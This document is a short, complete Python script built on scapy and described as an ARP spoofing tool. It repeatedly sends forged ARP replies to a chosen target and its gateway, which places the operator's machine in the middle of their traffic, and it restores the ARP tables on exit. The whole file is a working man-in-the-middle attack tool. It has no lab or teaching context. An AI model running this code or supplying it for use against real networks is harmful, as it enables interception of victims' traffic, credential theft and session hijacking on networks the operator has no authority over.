#!/usr/bin/env python3

from scapy.all import *
import argparse
import time
import sys
import os

def get_mac(ip):
    answered, unanswered = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for sent, received in answered:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC for {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if not dest_mac or not src_mac:
        return
    packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=0)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    args = parser.parse_args()

    try:
        print(f"[+] Starting ARP spoofing: {args.target} <-> {args.gateway}")
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C ... Resetting ARP tables...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print("[+] ARP tables restored. Exiting.")
        sys.exit()

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("[-] Please run as root (sudo).")
    main()
